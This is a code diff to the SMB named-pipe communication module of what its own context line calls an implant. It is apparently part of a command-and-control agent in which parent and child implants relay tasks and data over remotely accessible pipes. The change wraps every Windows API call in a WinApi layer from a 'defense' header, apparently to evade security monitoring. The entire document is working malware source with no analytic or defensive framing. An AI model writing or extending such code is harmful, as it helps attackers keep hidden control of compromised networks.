@@ -24,7 +24,7 @@ and an internal chain map that tells what my implant is connected to, and what t
 #include <mutex>
 #include "comms/queues.h"
 #include "_debug/debug.h"
-
+#include "defense/winapi.h"
 //Awaits for a parent to connect to the pipe. IF we don't have this, we get an immediate
 //536 pipe error: Waiting for a process to open the other end of the pipe.
 
@@ -44,8 +44,8 @@ namespace SMB {
 
         while (true) {
             DEBUG_LOG("[SMB::read_pipe_dynamic]: Reading " << CHUNK_SIZE << " bytes from pipe");
-            BOOL success = ReadFile(h_pipe, chunk.data(), CHUNK_SIZE, &bytes_read, NULL);
-            DWORD err = GetLastError();
+            BOOL success = WinApi::ReadFile(h_pipe, chunk.data(), CHUNK_SIZE, &bytes_read, NULL);
+            DWORD err = WinApi::GetLastError();
 
             // Append whatever was just read to the master buffer
             if (bytes_read > 0) {
@@ -81,11 +81,11 @@ namespace SMB {
             DEBUG_LOG("[SMB::Child::await_client_connection]: Waiting for parent to connect to " << pipe_name << " pipe...");
 
             // Synchronous block. It halts the thread here until the parent connects.
-            BOOL connected = ConnectNamedPipe(h_pipe, NULL);
+            BOOL connected = WinApi::ConnectNamedPipe(h_pipe, NULL);
 
-            if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
+            if (!connected && WinApi::GetLastError() != ERROR_PIPE_CONNECTED) {
                 //std::cerr << "ConnectNamedPipe failed: " << GetLastError() << std::endl;
-                DEBUG_LOG("[SMB::Child::await_client_connection]: Connecting to pipe failed: " << GetLastError());
+                DEBUG_LOG("[SMB::Child::await_client_connection]: Connecting to pipe failed: " << WinApi::GetLastError());
                 return false;
             }
 
@@ -99,7 +99,7 @@ namespace SMB {
             DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
 
             // STRIPPED: FILE_FLAG_OVERLAPPED
-            h_inbox_pipe = CreateNamedPipeW(
+            h_inbox_pipe = WinApi::CreateNamedPipeW(
                 wstr_pipe_inbox.c_str(),
                 PIPE_ACCESS_INBOUND,
                 PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
@@ -107,7 +107,7 @@ namespace SMB {
             );
 
             if (h_inbox_pipe == INVALID_HANDLE_VALUE) {
-                DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()) << " Error: " << GetLastError());
+                DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()) << " Error: " << WinApi::GetLastError());
                 return 1;
             }
             DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registered successfully: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
@@ -117,7 +117,7 @@ namespace SMB {
             DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()));
 
             // STRIPPED: FILE_FLAG_OVERLAPPED
-            h_outbox_pipe = CreateNamedPipeW(
+            h_outbox_pipe = WinApi::CreateNamedPipeW(
                 wstr_pipe_outbox.c_str(),
                 PIPE_ACCESS_OUTBOUND,
                 PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
@@ -125,7 +125,7 @@ namespace SMB {
             );
 
             if (h_outbox_pipe == INVALID_HANDLE_VALUE) {
-                DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " <<std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()) << " Error: " << GetLastError());
+                DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " <<std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()) << " Error: " << WinApi::GetLastError());
                 return 1;
             }
 
@@ -140,8 +140,8 @@ namespace SMB {
             DWORD bytes_written = 0;
             DEBUG_LOG("[SMB::Child::fetch_tasks]: Fetching Tasks");
             // Write the GET request up to the Parent
-            if (!WriteFile(h_outbox, get_request_payload.data(), static_cast<DWORD>(get_request_payload.size()), &bytes_written, NULL)) {
-                DEBUG_LOG("[SMB::Child::fetch_tasks]: Write Error: " << GetLastError());
+            if (!WinApi::WriteFile(h_outbox, get_request_payload.data(), static_cast<DWORD>(get_request_payload.size()), &bytes_written, NULL)) {
+                DEBUG_LOG("[SMB::Child::fetch_tasks]: Write Error: " << WinApi::GetLastError());
                 return {};
             }
 
@@ -160,13 +160,13 @@ namespace SMB {
 
         bool send_data(HANDLE h_outbox, const std::vector<uint8_t>& payload) {
             if (payload.empty() || h_outbox == INVALID_HANDLE_VALUE) {
-                DEBUG_LOG("[SMB::Child::send_data]: Payload empty or outbox handle is invalid: " << GetLastError());
+                DEBUG_LOG("[SMB::Child::send_data]: Payload empty or outbox handle is invalid: " << WinApi::GetLastError());
                 return false;
             }
 
             DWORD bytes_written = 0;
-            if (!WriteFile(h_outbox, payload.data(), static_cast<DWORD>(payload.size()), &bytes_written, NULL)) {
-                DEBUG_LOG("[SMB::Child::send_data]: Immediate pipe write error: " << GetLastError());
+            if (!WinApi::WriteFile(h_outbox, payload.data(), static_cast<DWORD>(payload.size()), &bytes_written, NULL)) {
+                DEBUG_LOG("[SMB::Child::send_data]: Immediate pipe write error: " << WinApi::GetLastError());
                 return false;
             }
 
@@ -232,8 +232,8 @@ namespace SMB {
             }
 
             DWORD bytes_written = 0;
-            if (!WriteFile(h_write, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL)) {
-                DEBUG_LOG("[SMB::Parent::cycle_child]: WriteFile failed sending task to child. Error: " << GetLastError());
+            if (!WinApi::WriteFile(h_write, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL)) {
+                DEBUG_LOG("[SMB::Parent::cycle_child]: WriteFile failed sending task to child. Error: " << WinApi::GetLastError());
                 return nlohmann::json{};
             }
 
